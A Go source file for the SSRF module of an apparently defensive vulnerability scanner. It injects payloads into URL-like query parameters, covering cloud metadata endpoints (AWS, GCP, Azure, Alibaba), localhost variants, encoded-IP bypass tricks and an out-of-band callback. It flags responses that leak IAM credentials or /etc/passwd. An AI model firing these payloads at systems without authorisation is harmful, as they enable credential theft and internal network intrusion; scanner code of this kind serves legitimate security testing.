package ssrf

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"vulnscan-backend/model"
	"vulnscan-backend/pkg/payload"
	"vulnscan-backend/scan/engine"
)

type SSRFScanner struct {
	base         *engine.VulnScanner
	payloads     *payload.Loader
	callbackBase string
}

func New(callbackBase string, loader *payload.Loader) *SSRFScanner {
	return &SSRFScanner{
		callbackBase: callbackBase,
		payloads:     loader,
	}
}

func (m *SSRFScanner) ID() string       { return "ssrf" }
func (m *SSRFScanner) Name() string     { return "SSRF 检测" }
func (m *SSRFScanner) Category() string { return "vuln" }

func (m *SSRFScanner) Params() []engine.ModuleParam {
	return []engine.ModuleParam{engine.VulnVerificationParam()}
}

type ssrfPayload struct {
	name     string
	payloads func(token string) []string
	severity string
	detect   func(resp *http.Response, body string) bool
}

var internalTargets = []struct {
	name string
	url  string
}{
	{"AWS Metadata", "http://169.254.169.254/latest/meta-data/"},
	{"GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/"},
	{"Azure Metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"},
	{"Alibaba Metadata", "http://100.100.100.200/latest/meta-data/"},
	{"localhost HTTP", "http://127.0.0.1/"},
	{"localhost HTTPS", "https://127.0.0.1/"},
	{"IPv6 localhost", "http://[::1]/"},
	{"0.0.0.0", "http://0.0.0.0/"},
}

func (m *SSRFScanner) getInternalTargets() []struct {
	name string
	url  string
} {
	if m.payloads != nil {
		dbPayloads := m.payloads.GetPayloads("ssrf")
		var result []struct {
			name string
			url  string
		}
		for _, p := range dbPayloads {
			if p.Type == "basic" || p.Type == "cloud_metadata" || p.Type == "file_read" || p.Type == "protocol" {
				name := p.Name
				if name == "" {
					name = p.Value
				}
				result = append(result, struct {
					name string
					url  string
				}{name, p.Value})
			}
		}
		if len(result) > 0 {
			return result
		}
	}
	return internalTargets
}

var bypassTechniques = []struct {
	name    string
	mutator func(target string) string
}{
	{"Direct", func(t string) string { return t }},
	{"Decimal IP", func(t string) string {
		if strings.Contains(t, "127.0.0.1") {
			return strings.ReplaceAll(t, "127.0.0.1", "2130706433")
		}
		if strings.Contains(t, "169.254.169.254") {
			return strings.ReplaceAll(t, "169.254.169.254", "2852039166")
		}
		return t
	}},
	{"Hex IP", func(t string) string {
		if strings.Contains(t, "127.0.0.1") {
			return strings.ReplaceAll(t, "127.0.0.1", "0x7f000001")
		}
		return t
	}},
	{"Octal IP", func(t string) string {
		if strings.Contains(t, "127.0.0.1") {
			return strings.ReplaceAll(t, "127.0.0.1", "0177.0.0.01")
		}
		return t
	}},
	{"Short localhost", func(t string) string {
		return strings.ReplaceAll(t, "127.0.0.1", "127.1")
	}},
	{"DNS Rebinding localtest.me", func(t string) string {
		return strings.ReplaceAll(t, "127.0.0.1", "localtest.me")
	}},
	{"URL Encoding", func(t string) string {
		return strings.ReplaceAll(t, "127.0.0.1", "%31%32%37%2e%30%2e%30%2e%31")
	}},
	{"Double URL Encoding", func(t string) string {
		return strings.ReplaceAll(t, "127.0.0.1", "%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31")
	}},
}

func (m *SSRFScanner) Run(ctx context.Context, targets []*engine.Target, config map[string]interface{}) (*engine.ModuleResult, error) {
	m.base = engine.NewVulnScanner(config, engine.WithRedirectPolicy(engine.RedirectNoFollow))

	enableBypass := engine.GetConfigBool(config, "enable_bypass", true)
	verifyLevel := engine.GetConfigValue(config, "verification_level", "both")

	result := m.base.RunTargets(ctx, m.ID(), targets, func(ctx context.Context, target *engine.Target) []*engine.Finding {
		baseURL := buildBaseURL(target)
		if baseURL == "" {
			return nil
		}
		params := extractParams(baseURL)
		if len(params) == 0 {
			return nil
		}
		findings := m.testSSRF(ctx, target, baseURL, params, enableBypass, verifyLevel)
		return findings
	})

	engine.LogModuleComplete(m.ID(), len(targets), len(result.Findings), result.Duration)
	return result, nil
}

func (m *SSRFScanner) testSSRF(ctx context.Context, target *engine.Target, baseURL string, params []string, enableBypass bool, verifyLevel string) []*engine.Finding {
	var findings []*engine.Finding

	parsed, err := url.Parse(baseURL)
	if err != nil {
		return nil
	}

	token := generateToken()
	targets := m.getInternalTargets()

	for _, param := range params {
		for _, internal := range targets {
			techniques := bypassTechniques[:1]
			if enableBypass {
				techniques = bypassTechniques
			}

			for _, bypass := range techniques {
				select {
				case <-ctx.Done():
					return findings
				default:
				}

				payload := bypass.mutator(internal.url)

				q := parsed.Query()
				q.Set(param, payload)
				testURL := *parsed
				testURL.RawQuery = q.Encode()

				req, err := http.NewRequestWithContext(ctx, http.MethodGet, testURL.String(), nil)
				if err != nil {
					continue
				}
				resp, body, err := m.base.Client.FetchFull(req)
				if err != nil || resp == nil {
					continue
				}

				if finding := m.analyzeResponse(resp, body, param, internal.name, bypass.name, payload, testURL.String(), token, verifyLevel, target); finding != nil {
					findings = append(findings, finding)
				}
			}
		}
	}

	if m.callbackBase != "" {
		for _, param := range params {
			callbackURL := fmt.Sprintf("%s/%s/%s", m.callbackBase, token, param)

			q := parsed.Query()
			q.Set(param, callbackURL)
			testURL := *parsed
			testURL.RawQuery = q.Encode()

			req, _ := http.NewRequestWithContext(ctx, http.MethodGet, testURL.String(), nil)
			if req != nil {
				m.base.Client.Fetch(req)
			}
		}
	}

	return findings
}

func (m *SSRFScanner) analyzeResponse(resp *http.Response, body, param, target, bypass, payload, testURL, token, verifyLevel string, engineTarget *engine.Target) *engine.Finding {
	indicators := []struct {
		pattern    string
		confidence int
		detail     string
	}{
		{"ami-id", 95, "AWS EC2 AMI ID detected"},
		{"instance-id", 95, "AWS EC2 Instance ID detected"},
		{"iam/security-credentials", 95, "AWS IAM credentials exposed"},
		{"meta-data/hostname", 90, "AWS metadata hostname"},
		{"computeMetadata", 90, "GCP compute metadata detected"},
		{"project/project-id", 90, "GCP project ID detected"},
		{"\"vmId\"", 90, "Azure VM ID detected"},
		{"root:x:0:0", 95, "/etc/passwd content detected"},
		{"localhost", 60, "localhost reference in response"},
		{"127.0.0.1", 60, "loopback IP in response"},
		{"internal server", 50, "internal server error (possible SSRF)"},
	}

	if engine.ShouldRunExploit(verifyLevel) {
		for _, ind := range indicators {
			if strings.Contains(strings.ToLower(body), strings.ToLower(ind.pattern)) {
				return &engine.Finding{
					ModuleID:           "ssrf",
					Target:             engineTarget,
					Type:               "ssrf",
					Title:              fmt.Sprintf("SSRF: %s via param '%s' (%s)", target, param, bypass),
					Severity:           severityByTarget(target),
					Confidence:         ind.confidence,
					Evidence:           fmt.Sprintf("Pattern '%s' found: %s", ind.pattern, ind.detail),
					VerificationLevel:  engine.VerifyExploit,
					VerificationDetail: "internal-data-leaked",
					Timestamp:          time.Now(),
					Data: map[string]string{
						"param":   param,
						"target":  target,
						"bypass":  bypass,
						"payload": payload,
						"url":     testURL,
						"status":  fmt.Sprintf("%d", resp.StatusCode),
						"detail":  ind.detail,
					},
				}
			}
		}
	}

	if engine.ShouldRunPrinciple(verifyLevel) && resp.StatusCode == 200 {
		normalReq, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, removeParam(testURL, param), nil)
		if normalReq != nil {
			normalResp, normalBody, _ := m.base.Client.FetchFull(normalReq)
			if normalResp != nil && (normalResp.StatusCode != 200 || significantLengthDiff(body, normalBody)) {
				return &engine.Finding{
					ModuleID:           "ssrf",
					Target:             engineTarget,
					Type:               "ssrf_potential",
					Title:              fmt.Sprintf("疑似SSRF: param '%s' (%s → %s)", param, target, bypass),
					Severity:           "medium",
					Confidence:         50,
					Evidence:           fmt.Sprintf("Response differs: normal=%d/%d payload=%d/%d", normalResp.StatusCode, len(normalBody), resp.StatusCode, len(body)),
					VerificationLevel:  engine.VerifyPrinciple,
					VerificationDetail: "response-diff",
					Timestamp:          time.Now(),
					Data: map[string]string{
						"param":   param,
						"target":  target,
						"bypass":  bypass,
						"payload": payload,
						"url":     testURL,
					},
				}
			}
		}
	}

	return nil
}

func severityByTarget(target string) string {
	switch {
	case strings.Contains(target, "Metadata"):
		return "critical"
	case strings.Contains(target, "localhost"):
		return "high"
	default:
		return "high"
	}
}

func extractParams(rawURL string) []string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}

	var params []string
	seen := make(map[string]struct{})

	for key := range parsed.Query() {
		lower := strings.ToLower(key)
		if isLikelyURLParam(lower) {
			if _, ok := seen[key]; !ok {
				seen[key] = struct{}{}
				params = append(params, key)
			}
		}
	}

	return params
}

func isLikelyURLParam(name string) bool {
	urlParams := []string{
		"url", "uri", "link", "src", "source", "target",
		"dest", "destination", "redirect", "return",
		"next", "continue", "path", "file", "page",
		"callback", "webhook", "endpoint", "proxy",
		"fetch", "load", "open", "download", "img",
		"image", "icon", "logo", "avatar", "feed",
		"rss", "api", "service", "host", "domain",
		"site", "ref", "referer", "forward", "go",
		"out", "view", "show", "display", "include",
		"require", "read", "import", "resource",
	}

	for _, p := range urlParams {
		if name == p || strings.Contains(name, p) {
			return true
		}
	}
	return false
}

func removeParam(rawURL, param string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	q := parsed.Query()
	q.Del(param)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

func significantLengthDiff(a, b string) bool {
	la, lb := len(a), len(b)
	if la == 0 && lb == 0 {
		return false
	}
	diff := la - lb
	if diff < 0 {
		diff = -diff
	}
	maxLen := la
	if lb > maxLen {
		maxLen = lb
	}
	return float64(diff)/float64(maxLen) > 0.3
}

func generateToken() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

func buildBaseURL(t *engine.Target) string {
	if t.URL != "" {
		return t.URL
	}
	if t.Port <= 0 {
		return ""
	}
	host := t.Host
	if t.IP != "" {
		host = t.IP
	}
	scheme := "http"
	if t.Port == 443 || t.Port == 8443 {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s:%d", scheme, host, t.Port)
}

var _ = model.VulnPayload{}
